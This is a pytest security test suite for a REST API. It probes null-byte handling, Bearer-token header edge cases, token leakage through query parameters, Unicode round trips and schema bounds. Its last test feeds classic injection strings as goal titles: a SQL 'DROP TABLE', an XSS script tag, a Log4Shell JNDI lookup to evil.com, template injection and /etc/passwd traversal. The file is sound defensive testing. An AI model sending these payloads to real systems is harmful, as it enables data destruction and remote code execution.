"""tests/api/test_adversarial_m8_challenger.py - Independent Challenger Adversarial Stress Suite.

Engineered by challenger_m8_r2_1 to empirically probe:
1. Null-byte injection across all schema endpoints and field boundaries.
2. RFC 6750 Authorization header edge cases (schemes, casing, spacing, CRLF, empty tokens).
3. Query param token leakage prevention across all REST endpoints.
4. Multi-lingual Unicode preservation (Chinese Simplified/Traditional, Cyrillic, Devanagari, Arabic, Emojis, Math).
5. Schema fuzzing and boundary conditions (types, bounds, malformed JSON, SQL/command injection strings).
"""

from __future__ import annotations

import json
from typing import Any, Dict
import pytest
from starlette.testclient import TestClient


# ============================================================================
# 1. Null-Byte Injection Stress Testing Across All Schemas
# ============================================================================

@pytest.mark.parametrize(
    "field,payload",
    [
        ("title_with_solitary_null", {"title": "\x00"}),
        ("title_with_prefix_null", {"title": "\x00Build System"}),
        ("title_with_infix_null", {"title": "Build\x00System"}),
        ("title_with_suffix_null", {"title": "Build System\x00"}),
        ("title_with_double_null", {"title": "\x00\x00"}),
        ("description_with_null", {"title": "Valid Title", "description": "Attack \x00 vector"}),
        ("description_with_solitary_null", {"title": "Valid Title", "description": "\x00"}),
    ],
)
def test_challenger_goal_null_bytes_rejected_with_422(
    client: TestClient, auth_headers: dict, field: str, payload: dict
):
    """Verify POST /api/goals strictly rejects null bytes in title or description with 422."""
    res = client.post("/api/goals", json=payload, headers=auth_headers)
    assert res.status_code == 422, (
        f"Defect: POST /api/goals accepted null byte in {field} with HTTP {res.status_code}: {res.text}"
    )


@pytest.mark.parametrize(
    "payload",
    [
        {"name": "\x00"},
        {"name": "Project\x00Alpha"},
        {"name": "\x00Project"},
        {"name": "Valid Name", "description": "Exploit\x00payload"},
    ],
)
def test_challenger_project_create_null_bytes_rejected_with_422(
    client: TestClient, auth_headers: dict, payload: dict
):
    """Verify POST /api/projects rejects null bytes in name or description with 422."""
    res = client.post("/api/projects", json=payload, headers=auth_headers)
    assert res.status_code == 422, (
        f"Defect: POST /api/projects accepted null byte with HTTP {res.status_code}: {res.text}"
    )


def test_challenger_agent_message_null_bytes_rejected_with_422(
    client: TestClient, auth_headers: dict
):
    """Verify POST /api/agents/{id}/message rejects null bytes in message field with 422."""
    for bad_msg in ["\x00", "Hello\x00Agent", "\x00\x00\x00"]:
        res = client.post("/api/agents/CEO/message", json={"message": bad_msg}, headers=auth_headers)
        assert res.status_code == 422, (
            f"Defect: POST /api/agents/CEO/message accepted null byte message with HTTP {res.status_code}: {res.text}"
        )


# ============================================================================
# 2. Strict RFC 6750 Authentication Edge Cases
# ============================================================================

@pytest.mark.parametrize(
    "bad_auth_header,desc",
    [
        ("bearer {token}", "lowercase 'bearer'"),
        ("BEARER {token}", "uppercase 'BEARER'"),
        ("Token {token}", "Token scheme"),
        ("JWT {token}", "JWT scheme"),
        ("Basic {token}", "Basic scheme"),
        ("Bearer", "Bearer scheme without token"),
        ("Bearer ", "Bearer with trailing whitespace only"),
        ("{token}", "Token without scheme"),
    ],
)
def test_challenger_auth_header_variations_rejected_with_401(
    client: TestClient, test_token: str, bad_auth_header: str, desc: str
):
    """Verify non-RFC6750 compliant Authorization headers are strictly rejected with 401."""
    header_val = bad_auth_header.format(token=test_token)
    headers = {"Authorization": header_val}
    res = client.get("/api/projects", headers=headers)
    assert res.status_code == 401, (
        f"Auth vulnerability: Header variation '{desc}' ({repr(header_val)}) returned {res.status_code} instead of 401: {res.text}"
    )
    assert "WWW-Authenticate" in res.headers, "RFC 6750 requires WWW-Authenticate header on 401 responses"
    assert "Bearer" in res.headers["WWW-Authenticate"]


def test_challenger_auth_rfc6750_multispace_permitted(
    client: TestClient, auth_headers: dict, test_token: str
):
    """Verify RFC 6750 Section 2.1 '1*SP' allows multiple spaces between 'Bearer' and token."""
    headers = {"Authorization": f"Bearer  {test_token}"}
    res = client.get("/api/projects", headers=headers)
    assert res.status_code == 200, f"RFC 6750 1*SP permits multi-space, got {res.status_code}"


def test_challenger_auth_tampered_token_variations(
    client: TestClient, test_token: str
):
    """Verify prefix, suffix, and character alterations in token return 401."""
    tampered_tokens = [
        test_token[:-1],           # 1 character truncated
        test_token + "x",          # 1 character appended
        test_token[:10],           # partial prefix
        test_token[-10:],          # partial suffix
        test_token.replace("a", "b"),  # substituted chars
        "wrong_token_entirely",    # completely wrong token
        "",                        # empty string
    ]
    for bad in tampered_tokens:
        headers = {"Authorization": f"Bearer {bad}"}
        res = client.get("/api/projects", headers=headers)
        assert res.status_code == 401, f"Tampered token '{bad}' returned {res.status_code} instead of 401"


# ============================================================================
# 3. Query Param Token Leakage Prevention Across All REST Endpoints
# ============================================================================

@pytest.mark.parametrize(
    "method,endpoint,body",
    [
        ("GET", "/api/projects?token={token}", None),
        ("GET", "/api/agents?token={token}", None),
        ("GET", "/api/vault/read?path=company/identity&token={token}", None),
        ("POST", "/api/goals?token={token}", {"title": "Query Param Attack"}),
        ("POST", "/api/projects?token={token}", {"name": "Query Param Project"}),
        ("POST", "/api/vault/write?token={token}", {"path": "test.json", "data": {}, "agent_id": "CEO"}),
    ],
)
def test_challenger_rest_query_param_token_rejected_with_401(
    client: TestClient, test_token: str, method: str, endpoint: str, body: Any
):
    """Verify REST endpoints completely reject query param authentication without Authorization header."""
    url = endpoint.format(token=test_token)
    if method == "GET":
        res = client.get(url)
    else:
        res = client.post(url, json=body)
    assert res.status_code == 401, (
        f"Security vulnerability: REST {method} endpoint '{url}' accepted query param token with {res.status_code}: {res.text}"
    )


# ============================================================================
# 4. Multi-lingual Unicode Preservation (Chinese, Cyrillic, Devanagari, RTL)
# ============================================================================

@pytest.mark.parametrize(
    "language,title,desc",
    [
        (
            "Chinese_Simplified",
            "测试目标：构建全自动 AI 架构系统",
            "详细描述：执行多智能体协作与架构验证，无损处理中文字符。",
        ),
        (
            "Chinese_Traditional",
            "專案目標：建構全自主 AI 決策作業系統",
            "詳細描述：透過 LangGraph 與 CrewAI 達成繁體中文相容性。",
        ),
        (
            "Cyrillic_Russian",
            "Цель: Автономная операционная система ИИ",
            "Описание: Проверка целостности символов кириллицы при обработке REST-запросов.",
        ),
        (
            "Devanagari_Hindi",
            "प्रोजेक्ट अल्फा: स्वायत्त एआई ऑपरेटिंग सिस्टम",
            "विवरण: बहुभाषी देवनागरी लिपि का सटीक सत्यापन एवं संग्रहण।",
        ),
        (
            "Arabic_RTL",
            "مشروع ألفا: نظام التشغيل التنفيذي المستقل",
            "الوصف: التحقق من معالجة النصوص العربية من اليمين إلى اليسار بدقة تامة.",
        ),
        (
            "Mathematical_Alphanumeric",
            "Theorem: ∀x ∈ ℝ⁺, ∃y : y² = x",
            "Proof: ∮_C F·dr = ∬_S (∇ × F)·dS ∧ 𝔄𝔩𝔭𝔥𝔞-OS",
        ),
    ],
)
def test_challenger_multilingual_unicode_preservation(
    client: TestClient, auth_headers: dict, language: str, title: str, desc: str
):
    """Verify multi-lingual text is accepted (200 OK) and round-tripped without UTF-8 corruption."""
    # 1. Submit goal
    res = client.post("/api/goals", json={"title": title, "description": desc}, headers=auth_headers)
    assert res.status_code == 200, f"Goal submission failed for {language}: {res.status_code} - {res.text}"
    data = res.json()
    assert data["title"] == title, f"Title corrupted in response for {language}: {data['title']} != {title}"
    pid = data["project_id"]

    # 2. Query goal status
    res_status = client.get(f"/api/goals/{pid}", headers=auth_headers)
    assert res_status.status_code == 200
    status_data = res_status.json()
    assert title in status_data.get("title", "") or title in status_data.get("goal", ""), (
        f"Goal status query corrupted title for {language}"
    )

    # 3. Vault write and read roundtrip
    vpath = f"projects/{pid}/deliverables/lang_{language}.json"
    res_write = client.post(
        "/api/vault/write",
        json={"path": vpath, "data": {"lang": language, "title": title, "desc": desc}, "agent_id": "CTO"},
        headers=auth_headers,
    )
    assert res_write.status_code == 200, f"Vault write failed for {language}: {res_write.text}"

    res_read = client.get(f"/api/vault/read?path={vpath}", headers=auth_headers)
    assert res_read.status_code == 200, f"Vault read failed for {language}: {res_read.text}"
    vdata = res_read.json()
    assert vdata["title"] == title, f"Vault read corrupted title for {language}"
    assert vdata["desc"] == desc, f"Vault read corrupted desc for {language}"


# ============================================================================
# 5. Schema Boundary Conditions, Fuzzing & Injection Probing
# ============================================================================

@pytest.mark.parametrize(
    "invalid_complexity",
    [0, 6, -1, 100, 999999999999999999999],
)
def test_challenger_goal_complexity_bounds(
    client: TestClient, auth_headers: dict, invalid_complexity: int
):
    """Verify complexity must be in range [1, 5] -> rejected with 422 if outside."""
    payload = {"title": "Valid Goal Title", "complexity": invalid_complexity}
    res = client.post("/api/goals", json=payload, headers=auth_headers)
    assert res.status_code == 422, f"Expected 422 for complexity {invalid_complexity}, got {res.status_code}"


@pytest.mark.parametrize(
    "invalid_priority",
    ["urgent", "IMMEDIATE", "none", "123", "", "super-high"],
)
def test_challenger_goal_priority_whitelist(
    client: TestClient, auth_headers: dict, invalid_priority: str
):
    """Verify priority only accepts 'low', 'medium', 'high', 'critical' -> 422 otherwise."""
    payload = {"title": "Valid Goal Title", "priority": invalid_priority}
    res = client.post("/api/goals", json=payload, headers=auth_headers)
    assert res.status_code == 422, f"Expected 422 for priority {repr(invalid_priority)}, got {res.status_code}"


def test_challenger_empty_and_malformed_json_body(
    client: TestClient, auth_headers: dict
):
    """Verify empty body or malformed JSON payloads return 422."""
    headers_with_json = {**auth_headers, "Content-Type": "application/json"}

    # Raw empty body
    res_empty = client.post("/api/goals", content="", headers=headers_with_json)
    assert res_empty.status_code == 422

    # Malformed JSON syntax
    res_malformed = client.post("/api/goals", content="{'broken': json", headers=headers_with_json)
    assert res_malformed.status_code == 422


@pytest.mark.parametrize(
    "injection_string",
    [
        "' OR '1'='1",
        "'; DROP TABLE projects; --",
        "<script>alert('xss')</script>",
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}",
        "../../../../etc/passwd",
    ],
)
def test_challenger_injection_strings_handled_safely(
    client: TestClient, auth_headers: dict, injection_string: str
):
    """Verify injection payloads in goal title are treated as literal text without crashing or executing."""
    res = client.post("/api/goals", json={"title": injection_string}, headers=auth_headers)
    # The application should safely store it and return 200 (treating as literal text)
    # or reject if validation fails, but NEVER return 500 Internal Server Error.
    assert res.status_code in (200, 422), (
        f"Server crashed or misbehaved on injection payload {repr(injection_string)}: HTTP {res.status_code}"
    )
    if res.status_code == 200:
        data = res.json()
        assert data["title"] == injection_string
